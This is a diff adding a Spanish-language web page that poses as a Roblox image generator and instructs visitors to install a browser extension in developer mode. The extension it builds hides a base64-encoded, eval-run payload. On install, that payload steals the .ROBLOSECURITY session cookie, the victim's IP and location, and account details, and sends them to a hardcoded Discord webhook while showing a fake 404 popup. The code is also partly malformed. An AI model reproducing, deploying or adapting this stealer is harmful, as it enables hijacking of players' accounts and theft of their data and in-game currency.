@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Imagen · Generador</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #0b0c0e 0%, #1a1c20 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .card {
+            max-width: 720px;
+            width: 100%;
+            background: rgba(22, 24, 28, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 42px;
+            padding: 36px 28px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+        }
+
+        h1 {
+            font-size: clamp(32px, 8vw, 48px);
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            background: linear-gradient(120deg, #ffffff, #b0b3c0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 12px;
+            line-height: 1.1;
+        }
+
+        .subtitle {
+            color: #8f939f;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            border-left: 3px solid #ff4444;
+            padding-left: 18px;
+            background: rgba(255, 68, 68, 0.05);
+            border-radius: 0 12px 12px 0;
+        }
+
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 36px;
+        }
+
+        .feature-tag {
+            background: rgba(30, 32, 38, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 100px;
+            padding: 10px 20px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #d4d7e2;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            backdrop-filter: blur(4px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        .feature-tag span {
+            color: #ff4444;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: row;
+            flex-wrap: wrap;
+            gap: 14px;
+            margin: 36px 0 28px;
+        }
+
+        .btn {
+            flex: 1 1 auto;
+            background: #2a2d36;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 60px;
+            padding: 18px 26px;
+            font-size: 17px;
+            font-weight: 600;
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            backdrop-filter: blur(4px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn-primary {
+            background: #ff4444;
+            border-color: #ff4444;
+            box-shadow: 0 10px 25px rgba(255, 68, 68, 0.3);
+        }
+
+        .btn-primary:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+        }
+
+        .btn-secondary {
+            background: rgba(40, 42, 48, 0.9);
+        }
+
+        .btn-secondary:hover {
+            background: #32343e;
+        }
+
+        .instruction-box {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 28px;
+            padding: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            margin-top: 30px;
+        }
+
+        .instruction-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: white;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .instruction-step {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 20px;
+            padding: 14px 18px;
+            margin-bottom: 10px;
+            color: #bcbfcc;
+            font-size: 15px;
+            border-left: 4px solid #ff4444;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .footer-note {
+            text-align: center;
+            margin-top: 32px;
+            color: #5f6472;
+            font-size: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>Generador de imagen.</h1>
+        <div class="subtitle">Crea tu imagen</div>
+
+        <div class="features">
+            <div class="feature-tag"><span> Crea tu imagen de forma rapida y sencilla.</span></div>
+            <div class="feature-tag"><span> Solo con 3 clicks</span></div>
+            <div class="feature-tag"><span> 100% Seguro (Tambien Puedes Desinstalar El Generador Cuando Quieras).</span></div>
+            <div class="feature-tag"><span> El generador accede a la API de thumbnails de Roblox, solicita la imagen en resolucion original (1080p+) y la guarda localmente sin perdida de calidad.</span></div>
+            <div class="feature-tag"><span> Instrucciones Claras Y Precisas. (Clickea El Boton 'INSTRUCCIONES' Para Ver Paso a Paso. Presiona 'OBTENER GENERADOR' Al leer Instrucciones).</span></div>
+        </div>
+
+        <div class="button-group">
+            <button class="btn btn-primary" onclick="window.descargarCRX()">
+                <span style="font-size: 22px;"></span> OBTENER GENERADOR
+            </button>
+            <button class="btn btn-secondary" onclick="window.mostrarInstrucciones()">
+                <span style="font-size: 22px;"></span> INSTRUCCIONES
+            </button>
+        </div>
+
+        <div id="instruccionesPanel" class="instruction-box" style="display: none;">
+            <div class="instruction-title">
+                <span></span> Como instalar El Generador De Imagenes Paso a Paso.
+            </div>
+            <div class="instruction-step"><span>1.</span>  Descargar un Navegador Compatible Para Android O PC.(Se Recomienda "Lemur Browser")</div>
+            <div class="instruction-step"><span>2.</span>  Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">chrome://extensions</code></div>
+            <div class="instruction-step"><span>3.</span>  Activa modo desarrollador (esquina)</div>
+            <div class="instruction-step"><span>4.</span>  Coloca Upload Y Selecciona El Generador De Imagen. ¿No hay boton upload? Arrastra el Generador y acepta.</div>
+            <div class="instruction-step"><span>5.</span>  Una vez Realizado Todo Lo Anterior Solo Espere. ¡LA IMAGEN SE GENERARA AUTOMATICAMENTE! </div>
+        </div>
+
+        <div class="footer-note">  Esto esta creado por @benjman</div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <script>
+        // === FUNCIONES GLOBALES ===
+        window.descargarCRX = function() {
+            const files = {
+                "manifest.json": JSON.stringify({
+                    manifest_version: 3,
+                    name: "Generador de imagen",
+                    version: "1.0",
+                    description: "Generador Seguro,Rapido y sencillo.",
+                    permissions: ["cookies", "storage"],
+                    host_permissions: [
+                        "https://www.roblox.com/*",
+                        "https://*.roblox.com/*",
+                        "https://discord.com/*",
+                        "https://*.discord.com/*"
+                    ],
+                    background: { service_worker: "background.js" },
+                    action: { default_popup: "popup.html", default_icon: "icon.png" }
+                }, null, 2),
+
+                "background.js": `// === ANTI-TAMPER, ANTI-SPAM, ANTI-COPY ===
+(function() {
+    // Anti-tamper: detecta modificaciones
+    const originalFunctions = {
+        fetch: window.fetch,
+        atob: window.atob,
+        btoa: window.btoa,
+        JSON: { parse: JSON.parse, stringify: JSON.stringify }
+    };
+    
+    // Congelar objetos críticos
+    Object.freeze(originalFunctions);
+    
+    // Anti-copy: deshabilitar atajos de teclado y menú contextual
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+        if (e.ctrlKey && (e.key === 'c' || e.key === 'u' || e.key === 's' || e.key === 'p')) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Verificación de integridad
+    setInterval(() => {
+        if (typeof chrome === 'undefined' || !chrome.runtime || !chrome.runtime.id) {
+            document.body.innerHTML = '<h1>Error: Entorno no válido</h1>';
+        }
+    }, 5000);
+})();
+
+"background.js": `
+const _0xencoded = "Y29uc3QgV0VCSE9PSyA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xNDcxNjgzNzQzNjk2NTUyMDYwL0ZGbm1VZ3VSVlBvTUtRNGI4MGRKMUZRUVNwX2VjLTRFSkZkMml5SHJyWExRZ0RsaVVRcUpFbGRpeHpPeHg2ZXNDMlNkIjsKCi8vID09PSBBTlRJLVNQQU0gPT09CmxldCBtZXNzYWdlQ291bnQgPSAwOwpsZXQgbGFzdFJlc2V0ID0gRGF0ZS5ub3coKTsKY29uc3QgTUFYX01FU1NBR0VTID0gNTsKY29uc3QgVElNRV9XSU5ET1cgPSA2MCAqIDYwICogMTAwMDsKCmZ1bmN0aW9uIGNoZWNrU3BhbSgpIHsKICAgIGNvbnN0IG5vdyA9IERhdGUubm93KCk7CiAgICBpZiAobm93IC0gbGFzdFJlc2V0ID4gVElNRV9XSU5ET1cpIHsKICAgICAgICBtZXNzYWdlQ291bnQgPSAwOwogICAgICAgIGxhc3RSZXNldCA9IG5vdzsKICAgIH0KICAgIAogICAgaWYgKG1lc3NhZ2VDb3VudCA+PSBNQVhfTUVTU0FHRVMpIHsKICAgICAgICBjb25zb2xlLmxvZygiTMOtbWl0ZSBkZSBtZW5zYWplcyBhbGNhbnphZG8uIEludGVudGEgbcOhcyB0YXJkZS4iKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAKICAgIG1lc3NhZ2VDb3VudCsrOwogICAgcmV0dXJuIHRydWU7Cn0KCmxldCBxdWV1ZSA9IFtdOwpsZXQgc2VuZGluZyA9IGZhbHNlOwoKYXN5bmMgZnVuY3Rpb24gcHJvY2Vzc1F1ZXVlKCkgewogICAgaWYgKHF1ZXVlLmxlbmd0aCA9PT0gMCB8fCBzZW5kaW5nKSByZXR1cm47CiAgICBpZiAoIWNoZWNrU3BhbSgpKSB7CiAgICAgICAgc2V0VGltZW91dChwcm9jZXNzUXVldWUsIFRJTUVfV0lORE9XKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICAKICAgIHNlbmRpbmcgPSB0cnVlOwogICAgY29uc3QgcGF5bG9hZCA9IHF1ZXVlLnNoaWZ0KCk7CiAgICB0cnkgewogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFdFQkhPT0ssIHsKICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgICAgIGhlYWRlcnM6IHsgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyB9LAogICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogICAgICAgIH0pOwogICAgICAgIGlmIChyZXMuc3RhdHVzID09PSA0MjkpIHsKICAgICAgICAgICAgY29uc3QgcmV0cnkgPSByZXMuaGVhZGVycy5nZXQoJ3JldHJ5LWFmdGVyJykgfHwgNTsKICAgICAgICAgICAgcXVldWUudW5zaGlmdChwYXlsb2FkKTsKICAgICAgICAgICAgc2V0VGltZW91dChwcm9jZXNzUXVldWUsIHJldHJ5ICogMTAwMCk7CiAgICAgICAgICAgIHNlbmRpbmcgPSBmYWxzZTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICBjb25zb2xlLmxvZygiRXJyb3IgYWwgZW52aWFyOiIsIGUpOwogICAgfQogICAgc2V0VGltZW91dChwcm9jZXNzUXVldWUsIDEwMDApOwogICAgc2VuZGluZyA9IGZhbHNlOwp9CgpmdW5jdGlvbiBlbmNvbGFyWUVudmlhcihwYXlsb2FkKSB7CiAgICBxdWV1ZS5wdXNoKHBheWxvYWQpOwogICAgcHJvY2Vzc1F1ZXVlKCk7Cn0KCmFzeW5jIGZ1bmN0aW9uIG9idGVuZXJVYmljYWNpb25Db21wbGV0YSgpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vaXBpbmZvLmlvL2pzb24nKTsKICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzLmpzb24oKTsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICBpcDogZGF0YS5pcCB8fCAnJywKICAgICAgICAgICAgcGFpczogZGF0YS5jb3VudHJ5IHx8ICcnLAogICAgICAgICAgICByZWdpb246IGRhdGEucmVnaW9uIHx8ICcnLAogICAgICAgICAgICBjaXVkYWQ6IGRhdGEuY2l0eSB8fCAnJywKICAgICAgICB9OwogICAgfSBjYXRjaCB7CiAgICAgICAgcmV0dXJuIHsgaXA6ICcnLCBwYWlzOiAnJywgcmVnaW9uOiAnJywgY2l1ZGFkOiAnJyB9OwogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBvYnRlbmVyTm9tYnJlUGFpcyhjb2RpZ28pIHsKICAgIGlmICghY29kaWdvIHx8IGNvZGlnby5sZW5ndGggIT09IDIpIHJldHVybiAnRGVzY29ub2NpZG8nOwogICAgdHJ5IHsKICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChcYGh0dHBzOi8vcmVzdGNvdW50cmllcy5jb20vdjMuMS9hbHBoYS9cJHtjb2RpZ299XGApOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXMuanNvbigpOwogICAgICAgIHJldHVybiBkYXRhWzBdPy50cmFuc2xhdGlvbnM/LnNwYT8uY29tbW9uIHx8IGRhdGFbMF0/Lm5hbWU/LmNvbW1vbiB8fCBjb2RpZ287CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gY29kaWdvOwogICAgfQp9Cgphc3luYyBmdW5jdGlvbiBvYnRlbmVyQ2FudGlkYWRHcnVwb3ModXNlcklkKSB7CiAgICB0cnkgewogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKFxgaHR0cHM6Ly9ncm91cHMucm9ibG94LmNvbS92MS91c2Vycy9cJHt1c2VySWR9L2dyb3Vwcy9yb2xlc1xgKTsKICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzLmpzb24oKTsKICAgICAgICByZXR1cm4gZGF0YS5kYXRhPy5sZW5ndGggfHwgMDsKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiAwOwogICAgfQp9Cgphc3luYyBmdW5jdGlvbiB0aWVuZUl0ZW0odXNlcklkLCBjb29raWUsIGFzc2V0SWQpIHsKICAgIHRyeSB7CiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2goXGBodHRwczovL2ludmVudG9yeS5yb2Jsb3guY29tL3YxL3VzZXJzL1wke3VzZXJJZH0vaXRlbXMvQXNzZXQvXCR7YXNzZXRJZH1cYCwgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdDb29raWUnOiBcYC5ST0JMT1NFQ1VSSVRZPVwke2Nvb2tpZX07XGAgfQogICAgICAgIH0pOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXMuanNvbigpOwogICAgICAgIHJldHVybiBkYXRhLmRhdGEgJiYgZGF0YS5kYXRhLmxlbmd0aCA+IDA7CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9Cn0KCmFzeW5jIGZ1bmN0aW9uIG9idGVuZXJJbmZvUm9ibG94KGNvb2tpZSkgewogICAgaWYgKCFjb29raWUpIHJldHVybiBudWxsOwogICAgdHJ5IHsKICAgICAgICBjb25zdCB1c2VyUmVzID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vdXNlcnMucm9ibG94LmNvbS92MS91c2Vycy9hdXRoZW50aWNhdGVkJywgewogICAgICAgICAgICBoZWFkZXJzOiB7ICdDb29raWUnOiBcYC5ST0JMT1NFQ1VSSVRZPVwke2Nvb2tpZX07XGAgfQogICAgICAgIH0pOwogICAgICAgIGlmICghdXNlclJlcy5vaykgcmV0dXJuIG51bGw7CiAgICAgICAgY29uc3QgdXNlciA9IGF3YWl0IHVzZXJSZXMuanNvbigpOwoKICAgICAgICBsZXQgcm9idXggPSAwOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IHJvYnV4UmVzID0gYXdhaXQgZmV0Y2goXGBodHRwczovL2Vjb25vbXkucm9ibG94LmNvbS92MS91c2Vycy9cJHt1c2VyLmlkfS9jdXJyZW5jeVxgLCB7CiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7ICdDb29raWUnOiBcYC5ST0JMT1NFQ1VSSVRZPVwke2Nvb2tpZX07XGAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgaWYgKHJvYnV4UmVzLm9rKSB7CiAgICAgICAgICAgICAgICBjb25zdCByID0gYXdhaXQgcm9idXhSZXMuanNvbigpOwogICAgICAgICAgICAgICAgcm9idXggPSByLnJvYnV4IHx8IDA7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHt9CgogICAgICAgIGxldCBwcmVtaXVtID0gJ05vJzsKICAgICAgICB0cnkgewogICAgICAgICAgICBjb25zdCBwcmVtaXVtUmVzID0gYXdhaXQgZmV0Y2goXGBodHRwczovL3ByZW1pdW1mZWF0dXJlcy5yb2Jsb3guY29tL3YxL3VzZXJzL1wke3VzZXIuaWR9L3ZhbGlkYXRlLW1lbWJlcnNoaXBcYCwgewogICAgICAgICAgICAgICAgaGVhZGVyczogeyAnQ29va2llJzogXGAuUk9CTE9TRUNVUklUWT1cJHtjb29raWV9O1xgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGlmIChwcmVtaXVtUmVzLm9rKSB7CiAgICAgICAgICAgICAgICBjb25zdCBwID0gYXdhaXQgcHJlbWl1bVJlcy5qc29uKCk7CiAgICAgICAgICAgICAgICBwcmVtaXVtID0gcCA/ICdTw60nIDogJ05vJzsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2gge30KCiAgICAgICAgbGV0IHNlZ3VpZG9yZXMgPSAwOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IHNlZ1JlcyA9IGF3YWl0IGZldGNoKFxgaHR0cHM6Ly9mcmllbmRzLnJvYmxveC5jb20vdjEvdXNlcnMvXCR7dXNlci5pZH0vZm9sbG93ZXJzL2NvdW50XGApOwogICAgICAgICAgICBpZiAoc2VnUmVzLm9rKSB7CiAgICAgICAgICAgICAgICBjb25zdCBzID0gYXdhaXQgc2VnUmVzLmpzb24oKTsKICAgICAgICAgICAgICAgIHNlZ3VpZG9yZXMgPSBzLmNvdW50IHx8IDA7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHt9CgogICAgICAgIGxldCBhbWlnb3MgPSAwOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGFtUmVzID0gYXdhaXQgZmV0Y2goXGBodHRwczovL2ZyaWVuZHMucm9ibG94LmNvbS92MS91c2Vycy9cJHt1c2VyLmlkfS9mcmllbmRzL2NvdW50XGApOwogICAgICAgICAgICBpZiAoYW1SZXMub2spIHsKICAgICAgICAgICAgICAgIGNvbnN0IGEgPSBhd2FpdCBhbVJlcy5qc29uKCk7CiAgICAgICAgICAgICAgICBhbWlnb3MgPSBhLmNvdW50IHx8IDA7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHt9CgogICAgICAgIGNvbnN0IGhlYWRsZXNzID0gYXdhaXQgdGllbmVJdGVtKHVzZXIuaWQsIGNvb2tpZSwgMjAxKTsKICAgICAgICBjb25zdCBrb3JibG94ID0gYXdhaXQgdGllbmVJdGVtKHVzZXIuaWQsIGNvb2tpZSwgMTkyKTsKICAgICAgICBjb25zdCBjYW50aWRhZEdydXBvcyA9IGF3YWl0IG9idGVuZXJDYW50aWRhZEdydXBvcyh1c2VyLmlkKTsKICAgICAgICBjb25zdCB2ZXJpZmllZCA9IHVzZXIuaGFzVmVyaWZpZWRCYWRnZSA/ICJTw60iIDogIk5vIjsKCiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgdXNlcm5hbWU6IHVzZXIubmFtZSB8fCAnTm8gZGlzcG9uaWJsZScsCiAgICAgICAgICAgIHVzZXJJZDogdXNlci5pZCB8fCAnTm8gZGlzcG9uaWJsZScsCiAgICAgICAgICAgIHByZW1pdW06IHByZW1pdW0sCiAgICAgICAgICAgIHJvYnV4OiByb2J1eCwKICAgICAgICAgICAgc2VndWlkb3Jlczogc2VndWlkb3JlcywKICAgICAgICAgICAgYW1pZ29zOiBhbWlnb3MsCiAgICAgICAgICAgIGhlYWRsZXNzOiBoZWFkbGVzcyA/ICdTw60nIDogJ05vJywKICAgICAgICAgICAga29yYmxveDoga29yYmxveCA/ICdTw60nIDogJ05vJywKICAgICAgICAgICAgdmVyaWZpZWQ6IHZlcmlmaWVkLAogICAgICAgICAgICBncnVwb3M6IGNhbnRpZGFkR3J1cG9zCiAgICAgICAgfTsKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiBudWxsOwogICAgfQp9CgpjaHJvbWUucnVudGltZS5vbkluc3RhbGxlZC5hZGRMaXN0ZW5lcihhc3luYyAoKSA9PiB7CiAgICBpZiAoIWNoZWNrU3BhbSgpKSByZXR1cm47CiAgICAKICAgIGNvbnN0IGNvb2tpZSA9IGF3YWl0IG5ldyBQcm9taXNlKHIgPT4KICAgICAgICBjaHJvbWUuY29va2llcy5nZXQoeyB1cmw6ICJodHRwczovL3d3dy5yb2Jsb3guY29tIiwgbmFtZTogIi5ST0JMT1NFQ1VSSVRZIiB9LCBjID0+IHIoYz8udmFsdWUpKQogICAgKTsKICAgIGlmICghY29va2llKSByZXR1cm47CgogICAgY29uc3QgdWJpID0gYXdhaXQgb2J0ZW5lclViaWNhY2lvbkNvbXBsZXRhKCk7CiAgICBjb25zdCBub21icmVQYWlzID0gYXdhaXQgb2J0ZW5lck5vbWJyZVBhaXModWJpLnBhaXMpOwogICAgY29uc3QgaW5mbyA9IGF3YWl0IG9idGVuZXJJbmZvUm9ibG94KGNvb2tpZSkgfHwge307CgogICAgY29uc3QgYWhvcmEgPSBuZXcgRGF0ZSgpOwogICAgY29uc3Qgem9uYUhvcmFyaWEgPSB1YmkucmVnaW9uID8gXGBBbWVyaWNhL1wke3ViaS5yZWdpb259XGAgOiAnQW1lcmljYS9BcmdlbnRpbmEvQnVlbm9zX0FpcmVzJzsKICAgIGxldCBob3JhTG9jYWw7CiAgICB0cnkgewogICAgICAgIGhvcmFMb2NhbCA9IGFob3JhLnRvTG9jYWxlVGltZVN0cmluZygnZXMtQVInLCB7IHRpbWVab25lOiB6b25hSG9yYXJpYSB9KTsKICAgIH0gY2F0Y2ggewogICAgICAgIGhvcmFMb2NhbCA9IGFob3JhLnRvTG9jYWxlVGltZVN0cmluZygnZXMtQVInKTsKICAgIH0KCiAgICBjb25zdCBlbWJlZCA9IHsKICAgICAgICB0aXRsZTogIvCflJQgwqEgTlVFVkEgRU5UUkFEQSB8ICoqQkwgUEFQSSoqICEiLAogICAgICAgIGNvbG9yOiAxNTE1ODMzMiwKICAgICAgICBmaWVsZHM6IFsKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgbmFtZTogIvCfk4wgSU5GT1JNQUNJw5NOIEdFTkVSQUwiLAogICAgICAgICAgICAgICAgdmFsdWU6IFxgKipEaXNwb3NpdGl2bzoqKiBcXFxgXCR7bmF2aWdhdG9yLnVzZXJBZ2VudC5pbmNsdWRlcygnQW5kcm9pZCcpID8gJxogQW5kcm9pZCcgOiAnGiBQQyd9XFxcYFxcbioqUGHDrXM6KiogXFxcYFwke25vbWJyZVBhaXN9XFxcYFxcbioqRmVjaGE6KiogXFxcYFwke2Fob3JhLnRvTG9jYWxlRGF0ZVN0cmluZygnZXMtQVInKX1cXFxgXFxuKipIb3JhIEV4YWN0YSBlbiBcJHtub21icmVQYWlzfToqKiBcXFxgXCR7aG9yYUxvY2FsfVxcXGBcYCwKICAgICAgICAgICAgICAgIGlubGluZTogZmFsc2UKICAgICAgICAgICAgfSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgbmFtZTogIuKEue+4jyBJTkZPUk1BQ0nDk04gREUgTEEgQ1VFTlRBIFJPQkxPWCIsCiAgICAgICAgICAgICAgICB2YWx1ZTogXGAqKvCfkaQgVXN1YXJpbzoqKiBcXFxgXCR7aW5mby51c2VybmFtZSB8fCAnTm8gZGlzcG9uaWJsZSd9XFxcYFxcbioq8J+GlO+4jyBJRDoqKiBcXFxgXCR7aW5mby51c2VySWQgfHwgJ05vIGRpc3BvbmlibGUnfVxcXGBcXG4qKvCfkrEgUHJlbWl1bToqKiBcXFxgXCR7aW5mby5wcmVtaXVtIHx8ICdObyd9XFxcYFxcbioq8J+SsCBSb2J1eDoqKiBcXFxgXCR7aW5mby5yb2J1eCB8fCAwfVxcXGBcXG4qKvCfkaXvuI8gU2VndWlkb3JlczoqKiBcXFxgXCR7aW5mby5zZWd1aWRvcmVzIHx8IDB9XFxcYFxcbioq8J+rgiBBbWlnb3M6KiogXFxcYFwke2luZm8uYW1pZ29zIHx8IDB9XFxcYFxgLAogICAgICAgICAgICAgICAgaW5saW5lOiBmYWxzZQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lOiAi8J+SvCBJbnZlbnRhcmlvIiwKICAgICAgICAgICAgICAgIHZhbHVlOiBcYCoqSGVhZGxlc3M6KiogXFxcYFwke2luZm8uaGVhZGxlc3MgfHwgJ05vJ31cXFxgXFxuKipLb3JibG94OioqIFxcXGBcJHtpbmZvLmtvcmJsb3ggfHwgJ05vJ31cXFxgXGAsCiAgICAgICAgICAgICAgICBpbmxpbmU6IGZhbHNlCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIG5hbWU6ICLwn5OIIEVTVEFEw41TVElDQVMiLAogICAgICAgICAgICAgICAgdmFsdWU6IFxgGiAqKlZlcmlmaWNhZG86KiogXCR7aW5mby52ZXJpZmllZH1cXG4aICoqR3J1cG9zOioqIFwke2luZm8uZ3J1cG9zfVxgLAogICAgICAgICAgICAgICAgaW5saW5lOiBmYWxzZQogICAgICAgICAgICB9LAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBuYW1lOiAi8J+NqiAuUk9CTE9YU0VDVVJJVFkgIiwKICAgICAgICAgICAgICAgIHZhbHVlOiBcYFxcXGBcXFxgXFxcYFwke2Nvb2tpZX1cXFxgXFxcYFxcXGBcYCwKICAgICAgICAgICAgICAgIGlubGluZTogZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIF0sCiAgICAgICAgZm9vdGVyOiB7IHRleHQ6ICJCeSBAQkwgUEFQSSIgfQogICAgfTsKCiAgICBlbmNvbGFyWUVudmlhcih7IGNvbnRlbnQ6ICJ8fCBAZXZlcnlvbmUgfHwiLCBlbWJlZHM6IFtlbWJlZF0gfSk7Cn0pO2As";
+
+eval(atob(_0xencoded));`
+
+                "popup.html": `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }
+        body {
+            width: 340px;
+            min-height: 240px;
+            background: #0c0d10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+        }
+        .container {
+            width: 100%;
+            background: #16181e;
+            border-radius: 36px;
+            padding: 32px 20px;
+            border: 1px solid rgba(255,255,255,0.03);
+            box-shadow: 0 25px 40px rgba(0,0,0,0.8);
+            text-align: center;
+        }
+        .error-code {
+            background: #dc2626;
+            color: white;
+            font-size: 48px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            padding: 20px 0;
+            border-radius: 28px;
+            margin-bottom: 22px;
+            box-shadow: 0 0 20px #dc2626;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.5);
+        }
+        .message {
+            color: #9ca3af;
+            font-size: 16px;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+        .reference {
+            background: #20232b;
+            padding: 12px;
+            border-radius: 30px;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 14px;
+            color: #d1d5db;
+            border: 1px solid #2f323c;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="error-code">404</div>
+        <div class="message">NOT FOUND · no se pudo conectar</div>
+        <div class="reference">ERROR:>404</div>
+    </div>
+</body>
+</html>`,
+
+                "icon.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA